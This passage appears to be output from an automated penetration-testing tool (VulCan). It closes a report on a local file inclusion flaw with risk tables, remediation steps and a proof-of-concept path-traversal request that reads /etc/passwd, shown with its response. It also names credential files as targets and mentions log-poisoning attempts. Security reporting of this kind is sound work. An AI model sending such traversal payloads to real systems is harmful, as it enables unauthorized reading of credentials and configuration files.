+  - Log poisoning (via User-Agent) did not yield executable inclusion.
+  - `/proc/self/environ` manipulation was ineffective.
+
+---
+
+## **4. Impact and Risk Assessment**
+### **4.1 Technical Impact**
+| **Vulnerability** | **Impact**                                                                 | **Likelihood** | **Risk Level** |
+|-------------------|----------------------------------------------------------------------------|----------------|----------------|
+| **LFI**           | Arbitrary file read → Credential theft, config exposure, further recon. | High           | Critical       |
+
+- **Attacker Capabilities:**
+  - Read sensitive files (`/etc/shadow`, `wp-config.php`, SSH keys).
+  - Potentially discover other vulnerabilities (e.g., hardcoded credentials in config files).
+- **Limitations:**
+  - No direct code execution achieved.
+  - No evidence of privilege escalation or lateral movement.
+
+### **4.2 Business Impact**
+- **Data Breach Risk:** Exposure of credentials or PII could lead to compliance violations (e.g., GDPR fines).
+- **Reputational Harm:** Public disclosure of such a vulnerability could damage customer trust.
+- **Operational Risk:** While no RCE was achieved, LFI could be a stepping stone for more advanced attacks.
+
+---
+
+## **5. Recommendations**
+### **5.1 Immediate Actions (0–7 Days)**
+| **Action Item**                                                                 | **Responsible Party** |
+|---------------------------------------------------------------------------------|-----------------------|
+| Patch the `index.php` `page` parameter to block path traversal (e.g., regex filter). | Development Team      |
+| Restrict web server permissions to prevent access to sensitive files.         | System Administrators |
+| Deploy a WAF rule to block LFI attempts (e.g., ModSecurity rule for `../`).     | Security Team         |
+
+### **5.2 Short-Term Actions (1–4 Weeks)**
+| **Action Item**                                                                 | **Responsible Party** |
+|---------------------------------------------------------------------------------|-----------------------|
+| Conduct a full code review of the web application for similar vulnerabilities.  | Development Team      |
+| Implement file inclusion allow-listing (only permit known-safe files).         | Development Team      |
+| Enable PHP hardening (disable dangerous functions like `include()`, `file_get_contents()`). | System Administrators |
+
+### **5.3 Long-Term Actions (1–6 Months)**
+| **Action Item**                                                                 | **Responsible Party** |
+|---------------------------------------------------------------------------------|-----------------------|
+| Perform a comprehensive penetration test on the entire network.                 | Security Team         |
+| Implement a Secure Development Lifecycle (SDL) with static/dynamic code analysis. | Development Team      |
+| Deploy a File Integrity Monitoring (FIM) system to detect unauthorized file access. | Security Team         |
+
+---
+
+## **Appendix A: Evidence**
+### **LFI Proof of Concept (PoC)**
+**Request:**
+```http
+GET /index.php?page=../../../../etc/passwd HTTP/1.1
+Host: 192.168.2.0
+```
+**Response (Excerpt):**
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+**Confirmed:** Arbitrary file read successful.
+
+---
+**Report End**
+**Confidentiality Notice:** This document contains sensitive security information and should only be shared with authorized personnel.
+[92mReport saved to: /home/p4ultr4n/Workplace/VulCan/evidence/evidence_8b6569210859447d899eadf12ecb7200/final_report_20250827_021933.md[0m
+--- Đang lưu lại tiến trình của phiên làm việc ---
+Đã lưu phiên làm việc với tên: [36mSession_1756285684[0m
+[92m────────────────────────────────────────────────────────────────────────────────── [0m[1;31mVulCan Session Finished[0m[92m ──────────────────────────────────────────────────────────────────────────────────[0m
